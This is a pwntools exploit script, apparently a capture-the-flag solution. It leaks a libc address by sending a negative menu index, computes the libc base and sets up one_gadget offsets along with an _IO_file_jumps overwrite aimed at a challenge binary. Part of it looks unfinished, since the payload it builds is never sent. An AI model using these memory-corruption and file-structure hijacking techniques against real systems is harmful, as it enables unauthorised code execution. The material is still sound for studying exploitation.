#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+626
break *main+658
break *main+728
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# _IO_file_jumps 0000000000216600
# system 0000000000050d60
# _IO_2_1_stdout_ 000000000021a780

io = initialize()

one_gadget_1 = 0x50a37
one_gadget_2 = 0xebcf1
one_gadget_3 = 0xebcf5
one_gadget_4 = 0xebcf8

# show, leak libc address
io.sendlineafter(b'(1 - 5)', b'-3') # _IO_2_1_stdout_
io.recvuntil(b'Username : ')
leak = int(io.recvline().strip(), 16)
libc.address = leak - 0x21a780

# selecting index
io.sendlineafter(b'(1 - 5)', b'2')

offset = 0xd8
payload = flat({
    offset: [
        libc.address + one_gadget_1
    ]
})

# data to send
io.sendlineafter(b'Username :', flat(libc.address + 0x216600))

info('leak: %#x', leak)
info('libc addr: %#x', libc.address)

io.interactive()